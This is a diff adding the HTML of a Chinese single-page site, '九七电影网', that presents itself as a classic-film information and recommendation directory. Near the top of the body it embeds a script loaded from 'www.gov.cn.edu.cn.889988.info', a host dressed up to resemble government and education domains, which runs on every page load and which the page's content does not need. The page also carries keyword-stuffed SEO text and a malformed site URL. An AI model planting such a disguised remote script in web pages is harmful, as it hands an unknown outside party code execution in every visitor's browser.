@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>九七电影网 - 经典电影资料与影讯导航</title>
+    <meta name="description" content="九七电影网(jiuqidianyingwang-top)整理经典电影资料、影讯导航、影片介绍与影评内容，提供分类检索和观影指南。">
+    <meta name="keywords" content="九七电影网, jiuqidianyingwang-top, 经典电影, 电影资料, 影讯导航, 影片介绍, 影评">
+    <meta name="author" content="九七电影网">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "PingFang SC", "Microsoft YaHei", system-ui, sans-serif;
+        }
+        body {
+            background: #faf8f5;
+            color: #2d2d2d;
+            line-height: 1.7;
+        }
+        a {
+            text-decoration: none;
+            color: #e8533f;
+        }
+        a:hover {
+            color: #c0392b;
+        }
+        .wrap {
+            width: 100%;
+            max-width: 1180px;
+            margin: 0 auto;
+            padding: 0 16px;
+        }
+
+        /* 顶部 */
+        header {
+            background: #fff;
+            border-bottom: 2px solid #f0ebe4;
+            position: sticky;
+            top: 0;
+            z-index: 999;
+        }
+        .topbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            height: 64px;
+        }
+        .brand {
+            font-size: 22px;
+            font-weight: 800;
+            color: #1a1a1a;
+        }
+        .brand b {
+            color: #e8533f;
+        }
+        nav ul {
+            display: flex;
+            gap: 20px;
+            list-style: none;
+        }
+        nav ul li a {
+            font-size: 15px;
+            color: #4a4a4a;
+            padding: 8px 0;
+            border-bottom: 2px solid transparent;
+        }
+        nav ul li a:hover {
+            color: #e8533f;
+            border-bottom: 2px solid #e8533f;
+        }
+
+        /* 首屏 */
+        .hero {
+            background: linear-gradient(135deg, #fff5f3 0%, #ffe8d6 100%);
+            padding: 70px 0 60px;
+            text-align: center;
+        }
+        .hero h1 {
+            font-size: 34px;
+            color: #1a1a1a;
+            margin-bottom: 14px;
+        }
+        .hero p {
+            font-size: 17px;
+            color: #5a5a5a;
+            max-width: 680px;
+            margin: 0 auto 22px;
+        }
+        .hero .url {
+            display: inline-block;
+            background: #e8533f;
+            color: #fff;
+            padding: 10px 22px;
+            border-radius: 8px;
+            font-weight: 600;
+        }
+        .hero .url:hover {
+            background: #c0392b;
+            color: #fff;
+        }
+
+        /* 栏目 */
+        section {
+            padding: 56px 0;
+        }
+        .title {
+            text-align: center;
+            margin-bottom: 34px;
+        }
+        .title h2 {
+            font-size: 26px;
+            color: #1a1a1a;
+            display: inline-block;
+            padding-bottom: 8px;
+            border-bottom: 3px solid #e8533f;
+        }
+
+        /* 卡片 */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 18px;
+        }
+        .card {
+            background: #fff;
+            border: 1px solid #eee;
+            border-radius: 12px;
+            padding: 20px;
+            transition: .25s;
+        }
+        .card:hover {
+            box-shadow: 0 8px 24px rgba(232,83,63,.12);
+            transform: translateY(-4px);
+        }
+        .card .tag {
+            font-size: 13px;
+            color: #e8533f;
+            font-weight: 600;
+        }
+        .card h3 {
+            font-size: 18px;
+            margin: 8px 0;
+            color: #1a1a1a;
+        }
+        .card p {
+            font-size: 14px;
+            color: #666;
+        }
+
+        /* 分类 */
+        .cats {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            justify-content: center;
+            margin-bottom: 28px;
+        }
+        .cat {
+            background: #fff;
+            border: 1px solid #ddd;
+            padding: 8px 18px;
+            border-radius: 8px;
+            font-size: 14px;
+            color: #4a4a4a;
+        }
+
+        /* 排行 */
+        .rank {
+            max-width: 760px;
+            margin: 0 auto;
+        }
+        .row {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            background: #fff;
+            border: 1px solid #eee;
+            border-radius: 12px;
+            padding: 14px 18px;
+            margin-bottom: 14px;
+        }
+        .num {
+            width: 38px;
+            height: 38px;
+            border-radius: 8px;
+            background: #e8533f;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+        }
+        .row h3 {
+            font-size: 17px;
+            color: #1a1a1a;
+        }
+        .row p {
+            font-size: 14px;
+            color: #666;
+        }
+
+        /* 关于 */
+        .about {
+            background: #fff;
+            border: 1px solid #eee;
+            border-radius: 12px;
+            padding: 30px;
+            max-width: 820px;
+            margin: 0 auto;
+            text-align: center;
+        }
+        .about p {
+            color: #5a5a5a;
+            margin-bottom: 12px;
+        }
+        .about .site {
+            font-size: 18px;
+            font-weight: 700;
+            color: #e8533f;
+        }
+
+        footer {
+            background: #1a1a1a;
+            color: #aaa;
+            text-align: center;
+            padding: 26px 0;
+            font-size: 14px;
+        }
+        footer a {
+            color: #e8533f;
+        }
+
+        /* 移动端 */
+        @media (max-width: 900px) {
+            .grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        @media (max-width: 600px) {
+            .topbar {
+                flex-direction: column;
+                height: auto;
+                gap: 10px;
+                padding: 12px 0;
+            }
+            nav ul {
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 12px;
+            }
+            .hero h1 {
+                font-size: 26px;
+            }
+            .grid {
+                grid-template-columns: 1fr;
+            }
+            .row {
+                flex-direction: column;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header>
+    <div class="wrap topbar">
+        <div class="brand">九七<b>电影网</b></div>
+        <nav>
+            <ul>
+                <li><a href="#home">首页</a></li>
+                <li><a href="#latest">经典影片</a></li>
+                <li><a href="#categories">影片分类</a></li>
+                <li><a href="#ranking">推荐片单</a></li>
+                <li><a href="#about">关于本站</a></li>
+            </ul>
+        </nav>
+    </div>
+</header>
+
+<section id="home" class="hero">
+    <div class="wrap">
+        <h1>九七电影网 · 经典电影资料与影讯导航</h1>
+        <p>整理经典老片、高分电影、影片介绍与影评内容，方便影迷检索、了解影片信息和观影指南。</p>
+        <a class="url" href="https://jiuqidianyingwang-top">官网：https://jiuqidianyingwang-top</a>
+    </div>
+</section>
+
+<section id="latest">
+    <div class="wrap">
+        <div class="title"><h2>经典影片</h2></div>
+        <div class="grid">
+            <div class="card">
+                <div class="tag">经典剧情</div>
+                <h3>阿甘正传</h3>
+                <p>一部关于坚持与人生的经典之作，跨越时代的励志故事。</p>
+            </div>
+            <div class="card">
+                <div class="tag">科幻史诗</div>
+                <h3>黑客帝国</h3>
+                <p>颠覆认知的科幻经典，影响了一代人的视觉与哲学想象。</p>
+            </div>
+            <div class="card">
+                <div class="tag">悬疑犯罪</div>
+                <h3>肖申克的救赎</h3>
+                <p>关于希望与自由的永恒主题，影史评分长居前列。</p>
+            </div>
+            <div class="card">
+                <div class="tag">动作冒险</div>
+                <h3>碟中谍系列</h3>
+                <p>经典特工动作片，持续二十余年依然保持高水准。</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="categories" style="background:#fdf6f0;">
+    <div class="wrap">
+        <div class="title"><h2>影片分类</h2></div>
+        <div class="cats">
+            <div class="cat">经典老片</div>
+            <div class="cat">高分剧情</div>
+            <div class="cat">科幻冒险</div>
+            <div class="cat">悬疑犯罪</div>
+            <div class="cat">动作战争</div>
+            <div class="cat">喜剧爱情</div>
+            <div class="cat">动画奇幻</div>
+        </div>
+        <div class="grid">
+            <div class="card">
+                <h3>经典老片</h3>
+                <p>90年代及更早的影史佳作回顾。</p>
+            </div>
+            <div class="card">
+                <h3>高分剧情</h3>
+                <p>口碑与评分双高的剧情力作。</p>
+            </div>
+            <div class="card">
+                <h3>科幻冒险</h3>
+                <p>脑洞大开的世界观与视觉奇观。</p>
+            </div>
+            <div class="card">
+                <h3>悬疑犯罪</h3>
+                <p>烧脑推理与紧张叙事的完美结合。</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="ranking">
+    <div class="wrap">
+        <div class="title"><h2>推荐片单</h2></div>
+        <div class="rank">
+            <div class="row">
+                <div class="num">1</div>
+                <div>
+                    <h3>影史百大经典</h3>
+                    <p>综合评分、影响力与口碑的必看清单。</p>
+                </div>
+            </div>
+            <div class="row">
+                <div class="num">2</div>
+                <div>
+                    <h3>90年代黄金影片</h3>
+                    <p>好莱坞黄金十年代表作精选。</p>
+                </div>
+            </div>
+            <div class="row">
+                <div class="num">3</div>
+                <div>
+                    <h3>华语经典回顾</h3>
+                    <p>港片黄金时代与内地优秀作品合集。</p>
+                </div>
+            </div>
+            <div class="row">
+                <div class="num">4</div>
+                <div>
+                    <h3>冷门佳作挖掘</h3>
+                    <p>评分高但知名度较低的隐藏好片。</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="about" style="background:#fdf6f0;">
+    <div class="wrap">
+        <div class="title"><h2>关于本站</h2></div>
+        <div class="about">
+            <p><b>九七电影网</b> 是一个电影资料与影讯导航类站点，不提供盗版资源下载，也不转载未授权正片。</p>
+            <p>站点主要用于展示：经典电影介绍、高分片单推荐、影片分类检索、影评与观影指南。</p>
+            <p class="site">网站名称：九七电影网</p>
+            <p class="site">网站网址：https://jiuqidianyingwang-top</p>
+            <p>关键词：九七电影网、jiuqidianyingwang-top、经典电影、电影资料、影讯导航、影片介绍。</p>
+        </div>
+    </div>
+</section>
+
+<footer>
+    <div class="wrap">
+        九七电影网 · https://jiuqidianyingwang-top ｜ 单页展示站点，仅供电影资料检索与学习交流
+    </div>
+</footer>
+
+</body>
+</html>
